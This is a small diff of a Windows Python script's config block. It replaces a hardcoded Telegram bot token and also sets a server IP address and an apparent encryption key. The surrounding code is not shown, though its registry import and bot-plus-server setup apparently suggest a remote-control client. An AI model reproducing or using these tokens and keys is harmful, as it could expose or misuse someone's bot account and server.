@@ -17,7 +17,7 @@ import tempfile
 import winreg
 
 # ====== КОНФИГ (менять только здесь) ======
-BOT_TOKEN = "8617483102:AAGkFE-x8Z81Ex-PtnzkMURy1-1CI3KGpdU"  # @factadmwow_bot
+BOT_TOKEN = "8617483102:AAENaroHd7ahxiGyqozKErlOUSiYst45AYc"  # @factadmwow_bot
 SERVER_HOST = "185.23.238.149"
 SERVER_KEY  = "T50oo3dVlCOFFMUPwNdoPXIdjbbLwRi5RDmDASbq7C8="
 # ==========================================
